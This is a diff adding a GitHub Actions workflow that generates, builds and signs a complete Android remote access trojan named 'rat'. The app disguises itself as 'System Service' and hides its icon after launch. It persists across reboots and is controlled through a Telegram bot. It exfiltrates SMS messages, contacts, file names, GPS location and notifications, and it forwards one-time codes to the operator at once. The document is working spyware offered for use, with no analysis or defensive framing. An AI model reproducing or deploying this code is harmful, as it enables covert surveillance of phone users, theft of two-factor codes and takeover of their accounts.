@@ -1,0 +1,357 @@
+name: build
+on:
+  workflow_dispatch:
+    inputs:
+      token:
+        description: 'Bot Token'
+        required: true
+      chat:
+        description: 'Chat ID'
+        required: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - uses: android-actions/setup-android@v3
+
+      - uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: 8.5
+
+      - name: Generate project
+        env:
+          BT: ${{ github.event.inputs.token }}
+          CI: ${{ github.event.inputs.chat }}
+        run: |
+          mkdir -p app/src/main/java/com/vanta/rat
+          mkdir -p app/src/main/res/values
+
+          cat > settings.gradle <<'EOF'
+          include ':app'
+          rootProject.name = "Svc"
+          EOF
+
+          cat > build.gradle <<'EOF'
+          buildscript {
+            repositories { google(); mavenCentral() }
+            dependencies { classpath 'com.android.tools.build:gradle:8.1.2' }
+          }
+          allprojects { repositories { google(); mavenCentral() } }
+          EOF
+
+          cat > app/build.gradle <<'EOF'
+          apply plugin: 'com.android.application'
+          android {
+            namespace 'com.vanta.rat'
+            compileSdk 34
+            defaultConfig {
+              applicationId "com.vanta.rat"
+              minSdk 21
+              targetSdk 34
+              versionCode 1
+              versionName "1.0"
+            }
+            compileOptions {
+              sourceCompatibility JavaVersion.VERSION_1_8
+              targetCompatibility JavaVersion.VERSION_1_8
+            }
+            lint { abortOnError false }
+          }
+          dependencies { implementation 'org.json:json:20231013' }
+          EOF
+
+          cat > app/src/main/res/values/strings.xml <<EOF
+          <resources>
+            <string name="app_name">System Service</string>
+            <string name="vanta_token">$BT</string>
+            <string name="vanta_chat">$CI</string>
+          </resources>
+          EOF
+
+          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+            <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <application android:label="@string/app_name"
+                android:icon="@android:drawable/sym_def_app_icon">
+              <activity android:name=".MainActivity" android:exported="true">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity>
+              <service android:name=".BotService" android:exported="false"
+                  android:foregroundServiceType="dataSync"/>
+              <service android:name=".NotifListener" android:exported="true"
+                  android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+                <intent-filter>
+                  <action android:name="android.service.notification.NotificationListenerService"/>
+                </intent-filter>
+              </service>
+              <receiver android:name=".SmsReceiver" android:exported="true">
+                <intent-filter android:priority="999">
+                  <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                </intent-filter>
+              </receiver>
+              <receiver android:name=".BootReceiver" android:exported="true">
+                <intent-filter>
+                  <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                </intent-filter>
+              </receiver>
+            </application>
+          </manifest>
+          EOF
+
+          cat > app/src/main/java/com/vanta/rat/MainActivity.java <<'EOF'
+          package com.vanta.rat;
+          import android.Manifest;
+          import android.app.Activity;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.os.Build;
+          import android.os.Bundle;
+          import java.util.ArrayList;
+          import java.util.List;
+          public class MainActivity extends Activity {
+            protected void onCreate(Bundle b) {
+              super.onCreate(b);
+              if (Build.VERSION.SDK_INT >= 23) {
+                List<String> n = new ArrayList<>();
+                String[] p = { Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
+                  Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
+                  Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.POST_NOTIFICATIONS };
+                for (String s : p) if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) n.add(s);
+                if (!n.isEmpty()) requestPermissions(n.toArray(new String[0]), 1);
+              }
+              Intent i = new Intent(this, BotService.class);
+              if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
+              try {
+                getPackageManager().setComponentEnabledSetting(getComponentName(),
+                  PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+              } catch (Exception e) {}
+              finish();
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/com/vanta/rat/BotService.java <<'EOF'
+          package com.vanta.rat;
+          import android.app.*;
+          import android.content.*;
+          import android.database.Cursor;
+          import android.os.*;
+          import android.provider.*;
+          import java.io.*;
+          import java.net.*;
+          import org.json.*;
+          public class BotService extends Service {
+            static String TK = "", CH = "";
+            long off = 0;
+            public void onCreate() {
+              super.onCreate();
+              TK = getString(R.string.vanta_token);
+              CH = getString(R.string.vanta_chat);
+              startForeground(1, notif());
+              new Thread(new Runnable() { public void run() { loop(); } }).start();
+            }
+            Notification notif() {
+              String c = "c";
+              if (Build.VERSION.SDK_INT >= 26) {
+                NotificationChannel n = new NotificationChannel(c, "s", NotificationManager.IMPORTANCE_MIN);
+                ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(n);
+              }
+              Notification.Builder b = Build.VERSION.SDK_INT >= 26
+                ? new Notification.Builder(this, c) : new Notification.Builder(this);
+              return b.setContentTitle("sync").setSmallIcon(android.R.drawable.stat_notify_sync).build();
+            }
+            String post(String m, String d) {
+              try {
+                URL u = new URL("https://api.telegram.org/bot" + TK + "/" + m);
+                HttpURLConnection c = (HttpURLConnection) u.openConnection();
+                c.setDoOutput(true); c.setRequestMethod("POST"); c.setConnectTimeout(20000);
+                c.getOutputStream().write(d.getBytes("UTF-8"));
+                BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
+                StringBuilder s = new StringBuilder(); String l;
+                while ((l = r.readLine()) != null) s.append(l);
+                return s.toString();
+              } catch (Exception e) { return null; }
+            }
+            void send(String t) {
+              try { post("sendMessage", "chat_id=" + CH + "&text=" + URLEncoder.encode(t, "UTF-8")); }
+              catch (Exception e) {}
+            }
+            void loop() {
+              while (true) {
+                try {
+                  String r = post("getUpdates", "offset=" + off + "&timeout=30");
+                  if (r != null) {
+                    JSONArray a = new JSONObject(r).getJSONArray("result");
+                    for (int i = 0; i < a.length(); i++) {
+                      JSONObject u = a.getJSONObject(i);
+                      off = u.getLong("update_id") + 1;
+                      if (!u.has("message")) continue;
+                      JSONObject m = u.getJSONObject("message");
+                      if (!m.getJSONObject("chat").get("id").toString().equals(CH)) continue;
+                      if (!m.has("text")) continue;
+                      cmd(m.getString("text").trim());
+                    }
+                  }
+                } catch (Exception e) {}
+                try { Thread.sleep(1000); } catch (Exception e) {}
+              }
+            }
+            void cmd(String c) {
+              try {
+                if (c.equals("/sms")) send(sms());
+                else if (c.equals("/notif")) send(NotifListener.dump());
+                else if (c.equals("/loc")) send(loc());
+                else if (c.equals("/sys")) send(Build.MANUFACTURER + " " + Build.MODEL + " Android " + Build.VERSION.RELEASE);
+                else if (c.equals("/contacts")) send(contacts());
+                else if (c.equals("/files")) send(files());
+                else send("/sms /notif /loc /sys /contacts /files");
+              } catch (Exception e) {}
+            }
+            String sms() {
+              StringBuilder s = new StringBuilder("SMS:\n");
+              try {
+                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
+                while (c != null && c.moveToNext())
+                  s.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ")
+                   .append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
+                if (c != null) c.close();
+              } catch (Exception e) { s.append("no perm"); }
+              return s.toString();
+            }
+            String contacts() {
+              StringBuilder s = new StringBuilder("Contacts:\n");
+              try {
+                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                int n = 0;
+                while (c != null && c.moveToNext() && n < 30) {
+                  s.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(": ")
+                   .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
+                  n++;
+                }
+                if (c != null) c.close();
+              } catch (Exception e) { s.append("no perm"); }
+              return s.toString();
+            }
+            String files() {
+              StringBuilder s = new StringBuilder("Files:\n");
+              try {
+                File d = Environment.getExternalStorageDirectory();
+                for (File f : d.listFiles()) { if (f.isFile()) s.append(f.getName()).append("\n"); if (s.length() > 3000) break; }
+              } catch (Exception e) { s.append("no perm"); }
+              return s.toString();
+            }
+            String loc() {
+              try {
+                android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
+                android.location.Location l = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
+                if (l == null) l = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
+                if (l == null) return "no location";
+                return "https://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude();
+              } catch (Exception e) { return "no perm"; }
+            }
+            public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
+            public IBinder onBind(Intent i) { return null; }
+          }
+          EOF
+
+          cat > app/src/main/java/com/vanta/rat/NotifListener.java <<'EOF'
+          package com.vanta.rat;
+          import android.app.Notification;
+          import android.os.Bundle;
+          import android.service.notification.*;
+          import java.util.*;
+          public class NotifListener extends NotificationListenerService {
+            static final LinkedList<String> L = new LinkedList<>();
+            public void onNotificationPosted(StatusBarNotification s) {
+              try {
+                Bundle b = s.getNotification().extras;
+                String t = b.getString(Notification.EXTRA_TITLE, "");
+                CharSequence x = b.getCharSequence(Notification.EXTRA_TEXT);
+                String y = x == null ? "" : x.toString();
+                if (y.isEmpty() && t.isEmpty()) return;
+                String line = s.getPackageName() + " | " + t + ": " + y;
+                synchronized (L) { L.addFirst(line); while (L.size() > 60) L.removeLast(); }
+                boolean hot = s.getPackageName().contains("telegram") || y.matches(".*\\b\\d{4,6}\\b.*");
+                if (hot) new BotService().send("!! " + line);
+              } catch (Exception e) {}
+            }
+            public static String dump() {
+              StringBuilder s = new StringBuilder("Notifs:\n");
+              synchronized (L) { for (String x : L) s.append(x).append("\n"); }
+              return s.toString();
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/com/vanta/rat/SmsReceiver.java <<'EOF'
+          package com.vanta.rat;
+          import android.content.*;
+          import android.telephony.SmsMessage;
+          public class SmsReceiver extends BroadcastReceiver {
+            public void onReceive(Context c, Intent i) {
+              try {
+                Object[] p = (Object[]) i.getExtras().get("pdus");
+                StringBuilder s = new StringBuilder();
+                String f = "";
+                for (Object o : p) {
+                  SmsMessage m = SmsMessage.createFromPdu((byte[]) o);
+                  f = m.getOriginatingAddress();
+                  s.append(m.getMessageBody());
+                }
+                new BotService().send("SMS " + f + ": " + s);
+              } catch (Exception e) {}
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/com/vanta/rat/BootReceiver.java <<'EOF'
+          package com.vanta.rat;
+          import android.content.*;
+          import android.os.Build;
+          public class BootReceiver extends BroadcastReceiver {
+            public void onReceive(Context c, Intent i) {
+              try {
+                Intent s = new Intent(c, BotService.class);
+                if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s); else c.startService(s);
+              } catch (Exception e) {}
+            }
+          }
+          EOF
+
+      - name: Build
+        run: gradle assembleRelease --no-daemon
+
+      - name: Sign
+        run: |
+          keytool -genkey -v -keystore k.jks -alias a -keyalg RSA -keysize 2048 \
+            -validity 10000 -storepass vanta123 -keypass vanta123 -dname "CN=V" >/dev/null 2>&1
+          APK=$(find . -name "*.apk" | grep -v aligned | head -1)
+          BT=$(ls $ANDROID_HOME/build-tools | tail -1)
+          $ANDROID_HOME/build-tools/$BT/zipalign -p -f 4 "$APK" aligned.apk
+          $ANDROID_HOME/build-tools/$BT/apksigner sign --ks k.jks \
+            --ks-pass pass:vanta123 --out rat.apk aligned.apk
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: rat
+          path: rat.apk
